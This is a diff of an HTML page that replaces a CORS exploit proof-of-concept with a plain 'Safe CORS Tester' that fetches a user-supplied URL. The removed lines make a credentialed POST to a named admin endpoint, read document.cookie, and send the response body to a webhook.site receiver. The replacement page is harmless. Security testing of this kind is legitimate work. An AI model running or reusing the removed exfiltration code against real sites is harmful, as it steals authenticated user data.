@@ -1,49 +1,240 @@
 <!doctype html>
-<html>
-<head><meta charset="utf-8"><title>CORS PoC — exfil body</title></head>
-<body>
-<h3>CORS PoC — exfiltrate response body</h3>
-<button id="go">Run PoC</button>
-<pre id="out"></pre>
-<script>
-const TARGET = "https://admin.aakashpay.com/_app/admin/new/admin/"; 
-const RECEIVER = "https://webhook.site/0fd36535-ea21-4921-a838-dc158ef52167"; 
-
-function log(s){ document.getElementById('out').textContent += s + "\n"; }
-
-document.getElementById('go').onclick = async () => {
-  document.getElementById('out').textContent = "";
-  log("page origin: " + location.origin);
-  try {
-    const resp = await fetch(TARGET, {
-      method: "POST",
-      credentials: "include",
-      headers: { "Accept": "application/json"} 
-    });
-    log("Fetch resolved: status=" + resp.status + " ok=" + resp.ok);
-    log("Response headers:");
-    for (const [k,v] of resp.headers) log(k + ": " + v);
-
-    const body = await resp.text();
-    log("Body :\n" + body);
-    log("Cookie" + document.cookie)
-
-    try {
-      await fetch(RECEIVER, {
-        method: "POST",
-        mode: "no-cors",
-        body: "exfil=" + encodeURIComponent(body)
-      });
-      log("Exfil attempted to webhook.site");
-    } catch (e) {
-      log("Exfil fetch error: " + e);
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Safe CORS Tester</title>
+  <style>
+    /* Global Styles */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
-  } catch (e) {
-    log("Fetch error: " + e);
-    log("See DevTools Network for more details (request headers, status, and OPTIONS).");
-  }
-};
-</script>
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, #ff7b00, #ff2a68);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #fff;
+      font-size: 16px;
+    }
+
+    .container {
+      background-color: #2e2e2e;
+      padding: 2rem 2.5rem;
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+      width: 100%;
+      max-width: 600px;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 1rem;
+      color: #fff;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .note {
+      font-size: 0.9rem;
+      color: #ddd;
+      margin-bottom: 1.5rem;
+    }
+
+    .input-group {
+      margin-bottom: 1.5rem;
+    }
+
+    .input-group input[type="url"] {
+      padding: 0.8rem 1rem;
+      font-size: 1.1rem;
+      border-radius: 8px;
+      border: none;
+      width: 100%;
+      margin-bottom: 0.8rem;
+      outline: none;
+      background-color: #444;
+      color: #fff;
+      transition: all 0.3s ease;
+    }
+
+    .input-group input[type="url"]:focus {
+      background-color: #666;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+    }
+
+    .input-group button {
+      padding: 0.9rem 1.2rem;
+      font-size: 1.1rem;
+      border-radius: 6px;
+      border: none;
+      cursor: pointer;
+      margin-top: 1rem;
+      background: #ff7b00;
+      color: #fff;
+      width: 48%;
+      margin-right: 2%;
+      transition: all 0.3s ease;
+    }
+
+    .input-group button:hover {
+      background: #ff541c;
+    }
+
+    .checkbox-group {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 1.5rem;
+    }
+
+    .checkbox-group input {
+      margin-right: 8px;
+    }
+
+    .output {
+      background-color: #333;
+      padding: 1.2rem;
+      border-radius: 8px;
+      border: 1px solid #444;
+      max-height: 250px;
+      overflow-y: auto;
+      word-wrap: break-word;
+      white-space: pre-wrap;
+      font-size: 1rem;
+      color: #ddd;
+      margin-bottom: 1.5rem;
+    }
+
+    .status {
+      display: flex;
+      justify-content: space-between;
+      font-size: 1.1rem;
+      margin-bottom: 1.2rem;
+      color: #fff;
+    }
+
+    .status span {
+      font-weight: 600;
+    }
+
+    footer {
+      text-align: center;
+      font-size: 0.85rem;
+      color: #bbb;
+    }
+
+    footer a {
+      color: #ff7b00;
+      text-decoration: none;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+
+    /* Animation */
+    .fadeIn {
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      0% {
+        opacity: 0;
+      }
+      100% {
+        opacity: 1;
+      }
+    }
+
+    /* Button Styles */
+    .button-group {
+      display: flex;
+      justify-content: space-between;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container fadeIn">
+    <h1>Safe CORS Tester</h1>
+    <p class="note">Test CORS responses safely by entering an endpoint URL you control.</p>
+
+    <div class="input-group">
+      <input id="url" type="url" placeholder="https://api.example.com/test" />
+      <div class="button-group">
+        <button id="fetchBtn">Fetch (Mode: CORS)</button>
+        <button id="curlBtn" title="Copy Curl Command">Copy cURL</button>
+      </div>
+    </div>
+
+    <div class="checkbox-group">
+      <input id="creds" type="checkbox" />
+      <label for="creds" style="color: #fff;">Include credentials (cookies/HTTP auth)</label>
+    </div>
+
+    <div class="status">
+      <span>Status: <span id="status">—</span></span>
+      <span>Type: <span id="type">—</span></span>
+    </div>
+
+    <h4 style="color: #fff;">Response Body (First 200 KB)</h4>
+    <div id="out" class="output">—</div>
+    
+    <footer>
+      <p>Only test endpoints you own or have permission to test. <br/> Built with ❤️ by <a href="https://prabhhat.com" target="_blank">Prabhhat</a></p>
+    </footer>
+  </div>
+
+  <script>
+    const fetchBtn = document.getElementById('fetchBtn');
+    const curlBtn = document.getElementById('curlBtn');
+    const out = document.getElementById('out');
+    const statusEl = document.getElementById('status');
+    const typeEl = document.getElementById('type');
+
+    fetchBtn.addEventListener('click', async () => {
+      out.textContent = 'Fetching...';
+      statusEl.textContent = '—';
+      typeEl.textContent = '—';
+      try {
+        const url = document.getElementById('url').value.trim();
+        if (!url) { out.textContent = 'Please enter a valid URL you control.'; return; }
+        const useCreds = document.getElementById('creds').checked;
+        const resp = await fetch(url, {
+          mode: 'cors',
+          credentials: useCreds ? 'include' : 'omit',
+          cache: 'no-store'
+        });
+
+        statusEl.textContent = resp.status + ' ' + resp.statusText;
+        typeEl.textContent = resp.type;
+
+        // Try to display text. If binary, show notice.
+        const ct = resp.headers.get('content-type') || '';
+        if (ct.includes('application/json') || ct.startsWith('text/') || ct.includes('xml')) {
+          const text = await resp.text();
+          out.textContent = text.slice(0, 200000);
+        } else {
+          out.textContent = 'Received response with Content-Type: ' + ct + '. This tester displays text-like bodies only.';
+        }
+      } catch (err) {
+        out.textContent = 'Error: ' + err.message + '\n\nOpen DevTools → Console/Network for more details.';
+      }
+    });
+
+    curlBtn.addEventListener('click', () => {
+      const url = document.getElementById('url').value.trim();
+      if (!url) { alert('Enter a URL first'); return; }
+      const useCreds = document.getElementById('creds').checked;
+      const curl = useCreds ? `curl -i -c cookies.txt -b cookies.txt "${url}"` : `curl -i "${url}"`;
+      navigator.clipboard.writeText(curl).then(() => alert('cURL command copied to clipboard'));
+    });
+  </script>
 </body>
 </html>
- 
